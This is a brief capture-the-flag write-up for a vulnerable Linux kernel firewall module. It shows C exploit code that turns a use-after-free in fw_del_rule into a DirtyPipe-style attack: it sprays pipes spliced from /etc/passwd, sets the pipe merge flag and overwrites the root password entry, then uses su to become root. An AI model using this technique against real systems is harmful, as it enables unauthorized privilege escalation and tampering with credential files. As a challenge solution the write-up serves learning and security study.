# through the wall writeup

`fw_del_rule` has a use-after-free vulnerability:

```c
static long fw_del_rule(int idx)
{
    ...
    kfree(rules[idx]);
    ...
}
```

This can be utilized to carry out DirtyPipes attack, specifically in following steps:

## Step 1: Create UAF
```c
    strcpy(add_req.rule_str, "192.168.1.1 10.0.0.1 80 1 Test");
    idx = ioctl(fd, FW_ADD_RULE, &add_req);
    ioctl(fd, FW_DEL_RULE, (unsigned long)idx);
```

## Step 2: Spray pipes
```c
    for (int i = 0; i < SPRAY_PIPES; i++) {
        pipe(pipe_fds[i]);
        loff_t off = 0;
        splice(passwd_fd, &off, pipe_fds[i][1], NULL, 1, 0);
    }
```

## Step 3: Manipulate pipe flags and perform write to /etc/passwd
```c
    char *pwd = "oot:$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/sh\nctf:x:1000:1000::/home/ctf:/bin/sh\n";
    uint32_t flags = PIPE_BUF_FLAG_CAN_MERGE;
    fw_edit(fd, idx, 0x18, &flags, 4);

    ssize_t bytes = write(pipe_fds[0][1], pwd, strlen(pwd)); // pwd is new password, should be hash of some strings setup
```

After above steps the root password should be reset, run `su root` with new password to escalate privileges